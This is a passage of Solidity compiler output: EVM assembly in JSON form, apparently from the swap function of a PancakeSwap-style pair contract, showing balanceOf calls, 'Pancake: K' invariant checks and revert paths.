											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "162"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 13675,
											"end": 13715,
											"name": "POP"
										},
										{
											"begin": 13675,
											"end": 13715,
											"name": "POP"
										},
										{
											"begin": 13675,
											"end": 13715,
											"name": "POP"
										},
										{
											"begin": 13675,
											"end": 13715,
											"name": "POP"
										},
										{
											"begin": 13675,
											"end": 13715,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 13675,
											"end": 13715,
											"name": "MLOAD"
										},
										{
											"begin": 13675,
											"end": 13715,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "163"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "163"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 13675,
											"end": 13715,
											"name": "MLOAD"
										},
										{
											"begin": 13740,
											"end": 13780,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 13740,
											"end": 13780,
											"name": "DUP1"
										},
										{
											"begin": 13740,
											"end": 13780,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 13740,
											"end": 13780,
											"name": "DUP2"
										},
										{
											"begin": 13740,
											"end": 13780,
											"name": "MSTORE"
										},
										{
											"begin": 13774,
											"end": 13778,
											"name": "ADDRESS"
										},
										{
											"begin": 13740,
											"end": 13780,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 13740,
											"end": 13780,
											"name": "DUP3"
										},
										{
											"begin": 13740,
											"end": 13780,
											"name": "ADD"
										},
										{
											"begin": 13740,
											"end": 13780,
											"name": "MSTORE"
										},
										{
											"begin": 13740,
											"end": 13780,
											"name": "SWAP1"
										},
										{
											"begin": 13740,
											"end": 13780,
											"name": "MLOAD"
										},
										{
											"begin": 13675,
											"end": 13715,
											"name": "SWAP2"
										},
										{
											"begin": 13675,
											"end": 13715,
											"name": "SWAP10"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 13740,
											"end": 13765,
											"name": "DUP6"
										},
										{
											"begin": 13740,
											"end": 13765,
											"name": "AND"
										},
										{
											"begin": 13740,
											"end": 13765,
											"name": "SWAP2"
										},
										{
											"begin": 13740,
											"end": 13765,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": 13740,
											"end": 13765,
											"name": "SWAP2"
										},
										{
											"begin": 13740,
											"end": 13780,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 13740,
											"end": 13780,
											"name": "DUP1"
										},
										{
											"begin": 13740,
											"end": 13780,
											"name": "DUP3"
										},
										{
											"begin": 13740,
											"end": 13780,
											"name": "ADD"
										},
										{
											"begin": 13740,
											"end": 13780,
											"name": "SWAP3"
										},
										{
											"begin": 13675,
											"end": 13715,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 13675,
											"end": 13715,
											"name": "SWAP3"
										},
										{
											"begin": 13740,
											"end": 13780,
											"name": "SWAP1"
										},
										{
											"begin": 13740,
											"end": 13780,
											"name": "SWAP2"
										},
										{
											"begin": 13740,
											"end": 13780,
											"name": "SWAP1"
										},
										{
											"begin": 13740,
											"end": 13780,
											"name": "DUP3"
										},
										{
											"begin": 13740,
											"end": 13780,
											"name": "SWAP1"
										},
										{
											"begin": 13740,
											"end": 13780,
											"name": "SUB"
										},
										{
											"begin": 13740,
											"end": 13780,
											"name": "ADD"
										},
										{
											"begin": 13740,
											"end": 13780,
											"name": "DUP2"
										},
										{
											"begin": 13740,
											"end": 13765,
											"name": "DUP7"
										},
										{
											"begin": 13740,
											"end": 13780,
											"name": "DUP1"
										},
										{
											"begin": 13740,
											"end": 13780,
											"name": "EXTCODESIZE"
										},
										{
											"begin": 13740,
											"end": 13780,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "164"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "164"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 13740,
											"end": 13780,
											"name": "POP"
										},
										{
											"begin": 13740,
											"end": 13780,
											"name": "GAS"
										},
										{
											"begin": 13740,
											"end": 13780,
											"name": "STATICCALL"
										},
										{
											"begin": 13740,
											"end": 13780,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "165"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "165"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 13740,
											"end": 13780,
											"name": "POP"
										},
										{
											"begin": 13740,
											"end": 13780,
											"name": "POP"
										},
										{
											"begin": 13740,
											"end": 13780,
											"name": "POP"
										},
										{
											"begin": 13740,
											"end": 13780,
											"name": "POP"
										},
										{
											"begin": 13740,
											"end": 13780,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 13740,
											"end": 13780,
											"name": "MLOAD"
										},
										{
											"begin": 13740,
											"end": 13780,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "166"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "166"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 13740,
											"end": 13780,
											"name": "MLOAD"
										},
										{
											"begin": 13740,
											"end": 13780,
											"name": "SWAP7"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 13800,
											"end": 13814,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 13800,
											"end": 13814,
											"name": "SWAP6"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 13828,
											"end": 13850,
											"name": "DUP6"
										},
										{
											"begin": 13828,
											"end": 13850,
											"name": "AND"
										},
										{
											"begin": 13828,
											"end": 13850,
											"name": "DUP11"
										},
										{
											"begin": 13828,
											"end": 13850,
											"name": "SWAP1"
										},
										{
											"begin": 13828,
											"end": 13850,
											"name": "SUB"
										},
										{
											"begin": 13817,
											"end": 13850,
											"name": "DUP4"
										},
										{
											"begin": 13817,
											"end": 13850,
											"name": "GT"
										},
										{
											"begin": 13817,
											"end": 13916,
											"name": "PUSH [tag]",
											"value": "167"
										},
										{
											"begin": 13817,
											"end": 13916,
											"name": "JUMPI"
										},
										{
											"begin": 13915,
											"end": 13916,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 13817,
											"end": 13916,
											"name": "PUSH [tag]",
											"value": "168"
										},
										{
											"begin": 13817,
											"end": 13916,
											"name": "JUMP"
										},
										{
											"begin": 13817,
											"end": 13916,
											"name": "tag",
											"value": "167"
										},
										{
											"begin": 13817,
											"end": 13916,
											"name": "JUMPDEST"
										},
										{
											"begin": 13889,
											"end": 13899,
											"name": "DUP10"
										},
										{
											"begin": 13877,
											"end": 13886,
											"name": "DUP6"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 13877,
											"end": 13899,
											"name": "AND"
										},
										{
											"begin": 13877,
											"end": 13899,
											"name": "SUB"
										},
										{
											"begin": 13865,
											"end": 13873,
											"name": "DUP4"
										},
										{
											"begin": 13865,
											"end": 13900,
											"name": "SUB"
										},
										{
											"begin": 13817,
											"end": 13916,
											"name": "tag",
											"value": "168"
										},
										{
											"begin": 13817,
											"end": 13916,
											"name": "JUMPDEST"
										},
										{
											"begin": 13800,
											"end": 13916,
											"name": "SWAP1"
										},
										{
											"begin": 13800,
											"end": 13916,
											"name": "POP"
										},
										{
											"begin": 13926,
											"end": 13940,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 13966,
											"end": 13976,
											"name": "DUP10"
										},
										{
											"begin": 13954,
											"end": 13963,
											"name": "DUP6"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 13954,
											"end": 13976,
											"name": "AND"
										},
										{
											"begin": 13954,
											"end": 13976,
											"name": "SUB"
										},
										{
											"begin": 13943,
											"end": 13951,
											"name": "DUP4"
										},
										{
											"begin": 13943,
											"end": 13976,
											"name": "GT"
										},
										{
											"begin": 13943,
											"end": 14042,
											"name": "PUSH [tag]",
											"value": "169"
										},
										{
											"begin": 13943,
											"end": 14042,
											"name": "JUMPI"
										},
										{
											"begin": 14041,
											"end": 14042,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 13943,
											"end": 14042,
											"name": "PUSH [tag]",
											"value": "170"
										},
										{
											"begin": 13943,
											"end": 14042,
											"name": "JUMP"
										},
										{
											"begin": 13943,
											"end": 14042,
											"name": "tag",
											"value": "169"
										},
										{
											"begin": 13943,
											"end": 14042,
											"name": "JUMPDEST"
										},
										{
											"begin": 14015,
											"end": 14025,
											"name": "DUP10"
										},
										{
											"begin": 14003,
											"end": 14012,
											"name": "DUP6"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 14003,
											"end": 14025,
											"name": "AND"
										},
										{
											"begin": 14003,
											"end": 14025,
											"name": "SUB"
										},
										{
											"begin": 13991,
											"end": 13999,
											"name": "DUP4"
										},
										{
											"begin": 13991,
											"end": 14026,
											"name": "SUB"
										},
										{
											"begin": 13943,
											"end": 14042,
											"name": "tag",
											"value": "170"
										},
										{
											"begin": 13943,
											"end": 14042,
											"name": "JUMPDEST"
										},
										{
											"begin": 13926,
											"end": 14042,
											"name": "SWAP1"
										},
										{
											"begin": 13926,
											"end": 14042,
											"name": "POP"
										},
										{
											"begin": 14085,
											"end": 14086,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 14073,
											"end": 14082,
											"name": "DUP3"
										},
										{
											"begin": 14073,
											"end": 14086,
											"name": "GT"
										},
										{
											"begin": 14073,
											"end": 14103,
											"name": "DUP1"
										},
										{
											"begin": 14073,
											"end": 14103,
											"name": "PUSH [tag]",
											"value": "171"
										},
										{
											"begin": 14073,
											"end": 14103,
											"name": "JUMPI"
										},
										{
											"begin": 14073,
											"end": 14103,
											"name": "POP"
										},
										{
											"begin": 14102,
											"end": 14103,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 14090,
											"end": 14099,
											"name": "DUP2"
										},
										{
											"begin": 14090,
											"end": 14103,
											"name": "GT"
										},
										{
											"begin": 14073,
											"end": 14103,
											"name": "tag",
											"value": "171"
										},
										{
											"begin": 14073,
											"end": 14103,
											"name": "JUMPDEST"
										},
										{
											"begin": 14052,
											"end": 14163,
											"name": "PUSH [tag]",
											"value": "172"
										},
										{
											"begin": 14052,
											"end": 14163,
											"name": "JUMPI"
										},
										{
											"begin": 14052,
											"end": 14163,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 14052,
											"end": 14163,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 14052,
											"end": 14163,
											"name": "DUP2"
										},
										{
											"begin": 14052,
											"end": 14163,
											"name": "MSTORE"
										},
										{
											"begin": 14052,
											"end": 14163,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 14052,
											"end": 14163,
											"name": "ADD"
										},
										{
											"begin": 14052,
											"end": 14163,
											"name": "DUP1"
										},
										{
											"begin": 14052,
											"end": 14163,
											"name": "DUP1"
										},
										{
											"begin": 14052,
											"end": 14163,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 14052,
											"end": 14163,
											"name": "ADD"
										},
										{
											"begin": 14052,
											"end": 14163,
											"name": "DUP3"
										},
										{
											"begin": 14052,
											"end": 14163,
											"name": "DUP2"
										},
										{
											"begin": 14052,
											"end": 14163,
											"name": "SUB"
										},
										{
											"begin": 14052,
											"end": 14163,
											"name": "DUP3"
										},
										{
											"begin": 14052,
											"end": 14163,
											"name": "MSTORE"
										},
										{
											"begin": 14052,
											"end": 14163,
											"name": "PUSH",
											"value": "22"
										},
										{
											"begin": 14052,
											"end": 14163,
											"name": "DUP2"
										},
										{
											"begin": 14052,
											"end": 14163,
											"name": "MSTORE"
										},
										{
											"begin": 14052,
											"end": 14163,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 14052,
											"end": 14163,
											"name": "ADD"
										},
										{
											"begin": 14052,
											"end": 14163,
											"name": "DUP1"
										},
										{
											"begin": 14052,
											"end": 14163,
											"name": "PUSH data",
											"value": "50B0A6DD250A09C1CD083AD4BF9F97424665D60E7BC0A208A1151C7D0051999C"
										},
										{
											"begin": 14052,
											"end": 14163,
											"name": "PUSH",
											"value": "22"
										},
										{
											"begin": 14052,
											"end": 14163,
											"name": "SWAP2"
										},
										{
											"begin": 14052,
											"end": 14163,
											"name": "CODECOPY"
										},
										{
											"begin": 14052,
											"end": 14163,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 14052,
											"end": 14163,
											"name": "ADD"
										},
										{
											"begin": 14052,
											"end": 14163,
											"name": "SWAP2"
										},
										{
											"begin": 14052,
											"end": 14163,
											"name": "POP"
										},
										{
											"begin": 14052,
											"end": 14163,
											"name": "POP"
										},
										{
											"begin": 14052,
											"end": 14163,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 14052,
											"end": 14163,
											"name": "MLOAD"
										},
										{
											"begin": 14052,
											"end": 14163,
											"name": "DUP1"
										},
										{
											"begin": 14052,
											"end": 14163,
											"name": "SWAP2"
										},
										{
											"begin": 14052,
											"end": 14163,
											"name": "SUB"
										},
										{
											"begin": 14052,
											"end": 14163,
											"name": "SWAP1"
										},
										{
											"begin": 14052,
											"end": 14163,
											"name": "REVERT"
										},
										{
											"begin": 14052,
											"end": 14163,
											"name": "tag",
											"value": "172"
										},
										{
											"begin": 14052,
											"end": 14163,
											"name": "JUMPDEST"
										},
										{
											"begin": 14263,
											"end": 14284,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 14305,
											"end": 14347,
											"name": "PUSH [tag]",
											"value": "173"
										},
										{
											"begin": 14329,
											"end": 14346,
											"name": "PUSH [tag]",
											"value": "174"
										},
										{
											"begin": 14329,
											"end": 14338,
											"name": "DUP5"
										},
										{
											"begin": 14343,
											"end": 14345,
											"name": "PUSH",
											"value": "19"
										},
										{
											"begin": 14329,
											"end": 14346,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 14329,
											"end": 14342,
											"name": "PUSH [tag]",
											"value": "175"
										},
										{
											"begin": 14329,
											"end": 14346,
											"name": "AND"
										},
										{
											"begin": 14329,
											"end": 14346,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 14329,
											"end": 14346,
											"name": "tag",
											"value": "174"
										},
										{
											"begin": 14329,
											"end": 14346,
											"name": "JUMPDEST"
										},
										{
											"begin": 14305,
											"end": 14324,
											"name": "PUSH [tag]",
											"value": "176"
										},
										{
											"begin": 14305,
											"end": 14313,
											"name": "DUP8"
										},
										{
											"begin": 14318,
											"end": 14323,
											"name": "PUSH",
											"value": "2710"
										},
										{
											"begin": 14305,
											"end": 14324,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 14305,
											"end": 14317,
											"name": "PUSH [tag]",
											"value": "175"
										},
										{
											"begin": 14305,
											"end": 14324,
											"name": "AND"
										},
										{
											"begin": 14305,
											"end": 14324,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 14305,
											"end": 14324,
											"name": "tag",
											"value": "176"
										},
										{
											"begin": 14305,
											"end": 14324,
											"name": "JUMPDEST"
										},
										{
											"begin": 14305,
											"end": 14328,
											"name": "SWAP1"
										},
										{
											"begin": 14305,
											"end": 14347,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 14305,
											"end": 14328,
											"name": "PUSH [tag]",
											"value": "177"
										},
										{
											"begin": 14305,
											"end": 14347,
											"name": "AND"
										},
										{
											"begin": 14305,
											"end": 14347,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 14305,
											"end": 14347,
											"name": "tag",
											"value": "173"
										},
										{
											"begin": 14305,
											"end": 14347,
											"name": "JUMPDEST"
										},
										{
											"begin": 14263,
											"end": 14361,
											"name": "SWAP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 14375,
											"end": 14396,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 14417,
											"end": 14459,
											"name": "PUSH [tag]",
											"value": "178"
										},
										{
											"begin": 14441,
											"end": 14458,
											"name": "PUSH [tag]",
											"value": "174"
										},
										{
											"begin": 14441,
											"end": 14450,
											"name": "DUP5"
										},
										{
											"begin": 14455,
											"end": 14457,
											"name": "PUSH",
											"value": "19"
										},
										{
											"begin": 14441,
											"end": 14458,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 14441,
											"end": 14454,
											"name": "PUSH [tag]",
											"value": "175"
										},
										{
											"begin": 14441,
											"end": 14458,
											"name": "AND"
										},
										{
											"begin": 14441,
											"end": 14458,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 14417,
											"end": 14459,
											"name": "tag",
											"value": "178"
										},
										{
											"begin": 14417,
											"end": 14459,
											"name": "JUMPDEST"
										},
										{
											"begin": 14375,
											"end": 14473,
											"name": "SWAP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 14574,
											"end": 14620,
											"name": "PUSH [tag]",
											"value": "181"
										},
										{
											"begin": 14609,
											"end": 14619,
											"name": "PUSH",
											"value": "5F5E100"
										},
										{
											"begin": 14574,
											"end": 14604,
											"name": "PUSH [tag]",
											"value": "182"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 14574,
											"end": 14589,
											"name": "DUP12"
										},
										{
											"begin": 14574,
											"end": 14589,
											"name": "DUP2"
										},
										{
											"begin": 14574,
											"end": 14589,
											"name": "AND"
										},
										{
											"begin": 14574,
											"end": 14589,
											"name": "SWAP1"
										},
										{
											"begin": 14574,
											"end": 14604,
											"name": "DUP12"
										},
										{
											"begin": 14574,
											"end": 14604,
											"name": "AND"
										},
										{
											"begin": 14574,
											"end": 14604,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 14574,
											"end": 14593,
											"name": "PUSH [tag]",
											"value": "175"
										},
										{
											"begin": 14574,
											"end": 14604,
											"name": "AND"
										},
										{
											"begin": 14574,
											"end": 14604,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 14574,
											"end": 14604,
											"name": "tag",
											"value": "182"
										},
										{
											"begin": 14574,
											"end": 14604,
											"name": "JUMPDEST"
										},
										{
											"begin": 14574,
											"end": 14608,
											"name": "SWAP1"
										},
										{
											"begin": 14574,
											"end": 14620,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 14574,
											"end": 14608,
											"name": "PUSH [tag]",
											"value": "175"
										},
										{
											"begin": 14574,
											"end": 14620,
											"name": "AND"
										},
										{
											"begin": 14574,
											"end": 14620,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 14574,
											"end": 14620,
											"name": "tag",
											"value": "181"
										},
										{
											"begin": 14574,
											"end": 14620,
											"name": "JUMPDEST"
										},
										{
											"begin": 14512,
											"end": 14550,
											"name": "PUSH [tag]",
											"value": "183"
										},
										{
											"begin": 14512,
											"end": 14528,
											"name": "DUP4"
										},
										{
											"begin": 14533,
											"end": 14549,
											"name": "DUP4"
										},
										{
											"begin": 14512,
											"end": 14550,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 14512,
											"end": 14532,
											"name": "PUSH [tag]",
											"value": "175"
										},
										{
											"begin": 14512,
											"end": 14550,
											"name": "AND"
										},
										{
											"begin": 14512,
											"end": 14550,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 14512,
											"end": 14550,
											"name": "tag",
											"value": "183"
										},
										{
											"begin": 14512,
											"end": 14550,
											"name": "JUMPDEST"
										},
										{
											"begin": 14512,
											"end": 14620,
											"name": "LT"
										},
										{
											"begin": 14512,
											"end": 14620,
											"name": "ISZERO"
										},
										{
											"begin": 14487,
											"end": 14664,
											"name": "PUSH [tag]",
											"value": "184"
										},
										{
											"begin": 14487,
											"end": 14664,
											"name": "JUMPI"
										},
										{
											"begin": 14487,
											"end": 14664,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 14487,
											"end": 14664,
											"name": "DUP1"
										},
										{
											"begin": 14487,
											"end": 14664,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 14487,
											"end": 14664,
											"name": "DUP2"
										},
										{
											"begin": 14487,
											"end": 14664,
											"name": "MSTORE"
										},
										{
											"begin": 14487,
											"end": 14664,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 14487,
											"end": 14664,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 14487,
											"end": 14664,
											"name": "DUP3"
										},
										{
											"begin": 14487,
											"end": 14664,
											"name": "ADD"
										},
										{
											"begin": 14487,
											"end": 14664,
											"name": "MSTORE"
										},
										{
											"begin": 14487,
											"end": 14664,
											"name": "PUSH",
											"value": "A"
										},
										{
											"begin": 14487,
											"end": 14664,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 14487,
											"end": 14664,
											"name": "DUP3"
										},
										{
											"begin": 14487,
											"end": 14664,
											"name": "ADD"
										},
										{
											"begin": 14487,
											"end": 14664,
											"name": "MSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "50616E63616B653A204B"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "B0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 14487,
											"end": 14664,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 14487,
											"end": 14664,
											"name": "DUP3"
										},
										{
											"begin": 14487,
											"end": 14664,
											"name": "ADD"
										},
										{
											"begin": 14487,
											"end": 14664,
											"name": "MSTORE"
										},
										{
											"begin": 14487,
											"end": 14664,
											"name": "SWAP1"
										},
										{
											"begin": 14487,
											"end": 14664,
											"name": "MLOAD"
										},
										{
											"begin": 14487,
											"end": 14664,
											"name": "SWAP1"
										},
										{
											"begin": 14487,
											"end": 14664,
											"name": "DUP2"
										},
										{
											"begin": 14487,
											"end": 14664,
											"name": "SWAP1"
										},
										{
											"begin": 14487,
											"end": 14664,
											"name": "SUB"
										},
										{
											"begin": 14487,
											"end": 14664,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 14487,
											"end": 14664,
											"name": "ADD"
										},
										{
											"begin": 14487,
											"end": 14664,
											"name": "SWAP1"
										},
										{
											"begin": 14487,
											"end": 14664,
											"name": "REVERT"
										},
										{
											"begin": 14487,
											"end": 14664,
											"name": "tag",
											"value": "184"
										},
										{
											"begin": 14487,
											"end": 14664,
											"name": "JUMPDEST"
										},
										{
											"begin": 1270,
											"end": 1271,
											"name": "POP"
										},
										{
											"begin": 1270,
											"end": 1271,
											"name": "POP"
										},
										{
											"begin": 14685,
											"end": 14734,
											"name": "PUSH [tag]",
											"value": "185"
										},
										{
											"begin": 14693,
											"end": 14701,
											"name": "DUP5"
										},
										{
											"begin": 14703,
											"end": 14711,
											"name": "DUP5"
										},
										{
											"begin": 14713,
											"end": 14722,
											"name": "DUP9"
										},
										{
											"begin": 14724,
											"end": 14733,
											"name": "DUP9"
										},
										{
											"begin": 14685,
											"end": 14692,
											"name": "PUSH [tag]",
											"value": "186"
										},
										{
											"begin": 14685,
											"end": 14734,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 14685,
											"end": 14734,
											"name": "tag",
											"value": "185"
										},
										{
											"begin": 14685,
											"end": 14734,
											"name": "JUMPDEST"
										},
										{
											"begin": 14749,
											"end": 14815,
											"name": "PUSH",
											"value": "40"
										},
										{
